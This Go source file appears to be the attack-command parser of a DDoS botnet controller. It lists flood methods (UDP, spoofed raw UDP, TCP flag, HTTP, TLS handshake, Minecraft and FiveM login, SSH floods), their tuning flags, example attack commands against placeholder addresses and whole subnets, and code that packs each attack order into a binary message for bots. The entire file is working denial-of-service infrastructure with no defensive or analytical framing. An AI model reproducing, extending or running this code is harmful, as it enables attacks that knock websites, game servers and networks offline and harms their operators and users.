package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"net/url"
	"strconv"
	"strings"

	"github.com/mattn/go-shellwords"
)

type AttackInfo struct {
	attackID          uint8
	attackFlags       []uint8
	attackDescription string
}

type Attack struct {
	Duration    uint32
	Type        uint8
	Targets     map[uint32]uint8
	Flags       map[uint8]string
	HTTPTargets []string
}

type FlagInfo struct {
	flagID          uint8
	flagDescription string
}

// ──────────────────────────────────────────────────────
// FLAG IDs — MUST MATCH attack.h EXACTLY
// ──────────────────────────────────────────────────────
var flagInfoLookup = map[string]FlagInfo{
	"size":     {0,  "Packet payload size, default 512"},
	"len":      {0,  "Packet payload size, default 512"},
	"rand":     {1,  "Randomize payload: 1=yes, 0=no, default 1"},
	"tos":      {2,  "IP TOS field, default 0"},
	"ident":    {3,  "IP ID field, default random"},
	"ttl":      {4,  "IP TTL, default 255"},
	"df":       {5,  "Don't Fragment bit: 1=set, 0=no, default 0"},
	"sport":    {6,  "Source port, 0=random"},
	"port":     {7,  "Destination port"},
	"dport":    {7,  "Destination port"},
	"domain":   {8,  "Target domain name"},
	"dhid":     {9,  "DNS header ID, default random"},
	"urg":      {11, "TCP URG flag: 1=set, 0=no"},
	"ack":      {12, "TCP ACK flag: 1=set, 0=no"},
	"psh":      {13, "TCP PSH flag: 1=set, 0=no"},
	"rst":      {14, "TCP RST flag: 1=set, 0=no"},
	"syn":      {15, "TCP SYN flag: 1=set, 0=no"},
	"fin":      {16, "TCP FIN flag: 1=set, 0=no"},
	"seqnum":   {17, "TCP sequence number, default random"},
	"acknum":   {18, "TCP ACK number, default random"},
	"gcip":     {19, "GRE same dest IP as target: 1=yes"},
	"method":   {20, "HTTP method: GET/POST/HEAD/PUT/etc, default GET"},
	"postdata": {21, "HTTP POST body/data"},
	"path":     {22, "URL path OR full URL (http://... / https://...)"},
	"https":    {23, "HTTPS/TLS: 1=on, 0=off, auto-detected from URL"},
	"conns":    {24, "Connection count per target"},
	"source":   {25, "Source IP address (admin only)"},
	"minlen":   {26, "Minimum packet length"},
	"maxlen":   {27, "Maximum packet length"},
	"payload":  {28, "Custom payload string"},
	"repeat":   {29, "Payload repeat count"},
	"threads":  {30, "Worker thread count"},
	"rate":     {31, "Max requests per second"},
	"mode":     {32, "Mode: 0=Standard,1=Random,2=KeepAlive,3=NoResp,4=Bypass"},
	"hver":     {33, "HTTP version: 1=HTTP/1.1"},
	"aggressive": {34, "Hold connections open / TLS hellos per conn (1=on, 0=off)"},
	"version":  {35, "Minecraft protocol version (-1=rotate)"},
}

// ──────────────────────────────────────────────────────
// ATTACK METHODS — MUST MATCH attack.h EXACTLY
// ──────────────────────────────────────────────────────
var attackInfoLookup = map[string]AttackInfo{
	"udp":       {0,  []uint8{0, 1, 7, 30}, "Standard UDP flood"},
	"std":       {1,  []uint8{0, 1, 7, 30}, "HEX flood"},
	"stdhex":    {2,  []uint8{0, 6, 7, 30}, "STDHEX flood"},
	"udpbypass": {3,  []uint8{0, 6, 7, 30}, "NUDP flood"},
	"udphex":    {4,  []uint8{0, 1, 7, 8, 24, 30}, "UDPHEX flood"},
	"raw":       {5,  []uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25, 29, 30}, "RAW UDP flood (requires root)"},
	"game":      {6,  []uint8{0, 1, 7, 30}, "SAMP game flood"},
	"tcp":       {7,  []uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25, 30}, "Configurable TCP flag flood"},
	"http":      {8,  []uint8{7, 20, 21, 22, 23, 24, 30, 31, 32, 33}, "HTTP flood"},
	"fivem":     {9,  []uint8{7, 24, 34}, "FiveM connect flood (default port 30120)"},
	"mc":        {10, []uint8{7, 8, 24, 34, 35}, "Minecraft login flood (default port 25565)"},
	"minecraft": {10, []uint8{7, 8, 24, 34, 35}, "Minecraft login flood (default port 25565)"},
	"ssh":       {11, []uint8{7, 24, 34}, "SSH brute-force flood (default port 22)"},
	"tls":       {12, []uint8{0, 7, 8, 24, 34}, "TLS ClientHello flood (default port 443)"},
	"tlsbomb":   {12, []uint8{0, 7, 8, 24, 34}, "TLS ClientHello flood (default port 443)"},
	"socket":    {13, []uint8{0, 1, 7, 24, 30}, "TCP connect flood (real sockets, no root)"},
}

func uint8InSlice(a uint8, list []uint8) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

// ─── Parse URL into host, port, path, domain, https ───
func ParseHTTPURL(raw string) (host, port, path, domain string, https int, err error) {
	raw = strings.TrimSpace(raw)
	if !strings.HasPrefix(raw, "http://") && !strings.HasPrefix(raw, "https://") {
		raw = "http://" + raw
	}
	u, err := url.Parse(raw)
	if err != nil {
		return "", "", "", "", 0, err
	}

	https = 0
	if strings.EqualFold(u.Scheme, "https") {
		https = 1
	}

	host = u.Hostname()
	port = u.Port()
	if port == "" {
		if https == 1 {
			port = "443"
		} else {
			port = "80"
		}
	}

	path = u.Path
	if path == "" {
		path = "/"
	}
	if u.RawQuery != "" {
		path += "?" + u.RawQuery
	}

	domain = u.Hostname()
	return
}

// ─── Build help text for a method ───
func buildMethodHelp(name string, info AttackInfo) string {
	var sb strings.Builder
	sb.WriteString("\x1b[38;5;99m📋 ")
	sb.WriteString(name)
	sb.WriteString(" — ")
	sb.WriteString(info.attackDescription)
	sb.WriteString("\r\n\r\n🔧 Available flags:\r\n")

	for flagName, flagInfo := range flagInfoLookup {
		if uint8InSlice(flagInfo.flagID, info.attackFlags) {
			sb.WriteString("  ")
			sb.WriteString(flagName)
			sb.WriteString(" (")
			sb.WriteString(strconv.Itoa(int(flagInfo.flagID)))
			sb.WriteString("): ")
			sb.WriteString(flagInfo.flagDescription)
			sb.WriteString("\r\n")
		}
	}

	sb.WriteString("\r\n💡 Examples:\r\n")
	switch name {
	case "http":
		sb.WriteString("  http https://example.com 60\r\n")
		sb.WriteString("  http 1.2.3.4 60 method=POST path=/api conns=200\r\n")
		sb.WriteString("  http example.com 60 conns=500 mode=3\r\n")
		sb.WriteString("  http http://example.com/path 60 method=POST postdata=a=1\r\n")
		sb.WriteString("  http example.com 60 mode=4\r\n")
	case "syn":
		sb.WriteString("  syn 1.2.3.4 60 dport=80\r\n")
		sb.WriteString("  syn 1.2.3.4/24 60 dport=443 ttl=64 df=on\r\n")
		sb.WriteString("  syn 1.2.3.4 60 dport=80 source=random\r\n")
	case "ack":
		sb.WriteString("  ack 1.2.3.4 60 dport=80\r\n")
		sb.WriteString("  ack 1.2.3.4 60 dport=443 size=512\r\n")
		sb.WriteString("  ack 1.2.3.4 60 dport=80 source=random\r\n")
	case "tcp":
		sb.WriteString("  tcp 1.2.3.4 60 dport=80 syn=on\r\n")
		sb.WriteString("  tcp 1.2.3.4 60 dport=80 syn=on ack=on\r\n")
	case "socket":
		sb.WriteString("  socket 1.2.3.4 60 dport=80 conns=200\r\n")
		sb.WriteString("  socket 1.2.3.4 60 dport=443 conns=128 size=1024\r\n")
	case "fivem":
		sb.WriteString("  fivem 1.2.3.4 60 dport=30120 conns=32\r\n")
		sb.WriteString("  fivem 1.2.3.4 60 dport=30120 conns=64 aggressive=1\r\n")
	case "mc", "minecraft":
		sb.WriteString("  mc 1.2.3.4 60 dport=25565 domain=play.example.com\r\n")
		sb.WriteString("  mc 1.2.3.4 60 conns=32 version=763 aggressive=1\r\n")
	case "ssh":
		sb.WriteString("  ssh 1.2.3.4 60 dport=22 conns=16\r\n")
		sb.WriteString("  ssh 1.2.3.4 60 conns=32 aggressive=1\r\n")
	case "tls", "tlsbomb":
		sb.WriteString("  tls 1.2.3.4 60 dport=443 domain=example.com\r\n")
		sb.WriteString("  tls 1.2.3.4 60 domain=cdn.example.com size=8192 conns=32 aggressive=16\r\n")
	default:
		sb.WriteString("  " + name + " 1.2.3.4 60 dport=1234\r\n")
	}
	return sb.String()
}

// ─── Parse command into Attack struct ───
func NewAttack(str string, admin int) (*Attack, error) {
	atk := &Attack{
		Duration:    0,
		Type:        0,
		Targets:     make(map[uint32]uint8),
		Flags:       make(map[uint8]string),
		HTTPTargets: []string{},
	}

	args, _ := shellwords.Parse(str)
	if len(args) == 0 {
		var sb strings.Builder
		sb.WriteString("\x1b[38;5;99mAvailable methods:\r\n")
		for m, info := range attackInfoLookup {
			sb.WriteString("  ")
			sb.WriteString(m)
			sb.WriteString(" — ")
			sb.WriteString(info.attackDescription)
			sb.WriteString("\r\n")
		}
		sb.WriteString("\r\nType:  <method> ?  to see flags for that method\r\n")
		return nil, errors.New(sb.String())
	}

	atkName := args[0]
	atkInfo, exists := attackInfoLookup[atkName]
	if !exists {
		return nil, errors.New(fmt.Sprintf("\x1b[38;5;196mUnknown method: %s", atkName))
	}
	atk.Type = atkInfo.attackID
	args = args[1:]

	// Show help: "syn ?", "ack ?", etc.
	if len(args) > 0 && args[0] == "?" {
		return nil, errors.New(buildMethodHelp(atkName, atkInfo))
	}

	if len(args) == 0 {
		return nil, errors.New("Missing target and duration. Try: " + atkName + " ?")
	}

	// ─── Parse targets ───
	if atkName == "http" {
		urlList := strings.Split(args[0], ",")
		if len(urlList) > 255 {
			return nil, errors.New("Too many targets (max 255)")
		}
		for _, rawURL := range urlList {
			host, port, path, domain, https, err := ParseHTTPURL(strings.TrimSpace(rawURL))
			if err != nil {
				return nil, errors.New(fmt.Sprintf("Invalid URL: %s — %v", rawURL, err))
			}
			atk.HTTPTargets = append(atk.HTTPTargets, rawURL)
			ip := net.ParseIP(host)
			if ip != nil {
				atk.Targets[binary.BigEndian.Uint32(ip[12:])] = 32
			}
			if _, ok := atk.Flags[8]; !ok && domain != "" {
				atk.Flags[8] = domain
			}
			if _, ok := atk.Flags[7]; !ok && port != "" {
				atk.Flags[7] = port
			}
			if _, ok := atk.Flags[22]; !ok && path != "" {
				atk.Flags[22] = path
			}
			if _, ok := atk.Flags[23]; !ok {
				atk.Flags[23] = strconv.Itoa(https)
			}
		}
		args = args[1:]
	} else {
		cidrList := strings.Split(args[0], ",")
		if len(cidrList) > 255 {
			return nil, errors.New("Too many targets (max 255)")
		}
		for _, cidr := range cidrList {
			parts := strings.Split(cidr, "/")
			ip := net.ParseIP(parts[0])
			if ip == nil {
				return nil, errors.New(fmt.Sprintf("Invalid IP: %s", parts[0]))
			}
			mask := uint8(32)
			if len(parts) == 2 {
				m, _ := strconv.Atoi(parts[1])
				if m >= 0 && m <= 32 {
					mask = uint8(m)
				}
			}
			atk.Targets[binary.BigEndian.Uint32(ip[12:])] = mask
		}
		args = args[1:]
	}

	// ─── Parse duration ───
	if len(args) == 0 {
		return nil, errors.New("Missing duration (seconds)")
	}
	dur, err := strconv.Atoi(args[0])
	if err != nil || dur < 1 || dur > 21600 {
		return nil, errors.New("Invalid duration (1–21600 sec)")
	}
	atk.Duration = uint32(dur)
	args = args[1:]

	// ─── Parse flags ───
	for _, arg := range args {
		kv := strings.SplitN(arg, "=", 2)
		if len(kv) != 2 {
			return nil, errors.New("Bad flag format: use key=value")
		}
		fi, ok := flagInfoLookup[kv[0]]
		if !ok {
			return nil, errors.New("Unknown flag: " + kv[0])
		}
		if !uint8InSlice(fi.flagID, atkInfo.attackFlags) {
			return nil, errors.New("Flag '" + kv[0] + "' not supported for " + atkName)
		}
		if admin == 0 && fi.flagID == 25 {
			return nil, errors.New("Flag 'source' requires admin")
		}

		val := strings.Trim(kv[1], "\"'")
		switch strings.ToLower(val) {
		case "on", "yes", "true":
			val = "1"
		case "off", "no", "false":
			val = "0"
		}
		atk.Flags[fi.flagID] = val
	}

	return atk, nil
}

// ─── Serialize to binary packet ───
func (this *Attack) Build() ([]byte, error) {
	buf := make([]byte, 0, 512)

	// Duration (4 bytes, Big-Endian)
	tmp := make([]byte, 4)
	binary.BigEndian.PutUint32(tmp, this.Duration)
	buf = append(buf, tmp...)

	// Attack type
	buf = append(buf, byte(this.Type))

	// Target count
	buf = append(buf, byte(len(this.Targets)))

	// Target entries: IP(4 bytes) + mask(1 byte)
	for ip, mask := range this.Targets {
		tmp = make([]byte, 5)
		binary.BigEndian.PutUint32(tmp, ip)
		tmp[4] = byte(mask)
		buf = append(buf, tmp...)
	}

	// Flags count
	buf = append(buf, byte(len(this.Flags)))

	// Flags: ID(1 byte) + len(1 byte) + value
	for k, v := range this.Flags {
		valBytes := []byte(v)
		if len(valBytes) > 255 {
			return nil, errors.New("Flag value too long")
		}
		buf = append(buf, byte(k))
		buf = append(buf, byte(len(valBytes)))
		buf = append(buf, valBytes...)
	}

	// Total length prefix
	if len(buf) > 4096 {
		return nil, errors.New("Packet too large")
	}
	lenBuf := make([]byte, 2)
	binary.BigEndian.PutUint16(lenBuf, uint16(len(buf)))
	return append(lenBuf, buf...), nil
}
